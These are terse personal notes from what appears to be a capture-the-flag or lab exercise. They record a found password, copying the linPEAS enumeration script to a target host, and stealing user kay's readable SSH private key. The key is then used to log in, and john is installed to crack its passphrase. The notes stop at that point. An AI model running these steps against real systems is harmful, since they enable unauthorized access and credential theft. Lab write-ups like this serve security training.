		password was armando

4: What is the Username

		scp /usr/share/peass/linPEAS/linpeas.sh jan@10.10.147.170:/dev/shm
	> linpeas found a readable ssh private key in home/kay/.ssh
		cat <SSH-TAR-FILE>
		copy the info and store locally -> kay_id_rsa
		chmod 600 kay_id_rsa
		-> ssh -i kay_id_rsa kay@10.10.147.170
			- this was passwd protected
		- installed john -
